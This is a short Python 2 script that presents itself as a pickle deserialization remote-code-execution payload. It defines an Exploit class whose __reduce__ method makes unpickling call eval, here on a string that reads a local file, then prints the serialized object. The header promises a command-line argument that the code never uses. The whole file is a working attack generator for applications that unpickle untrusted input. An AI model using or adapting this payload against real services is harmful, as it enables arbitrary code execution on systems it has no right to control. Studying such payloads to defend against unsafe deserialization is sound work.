#!/usr/bin/python
#
# Pickle deserialization RCE payload.
# To be invoked with command to execute at it's first parameter.
# Otherwise, the default one will be used.
#

import pickle as pk
import subprocess
import base64
import os
import sys

class Exploit(object):
    def __reduce__(self):
        return (eval,("file('test.py').read()",))

def serialize_exploit():
    shellcode = pk.dumps(Exploit())
    return shellcode

shellcode = serialize_exploit()
print shellcode + '#'
#print pk.loads(shellcode)
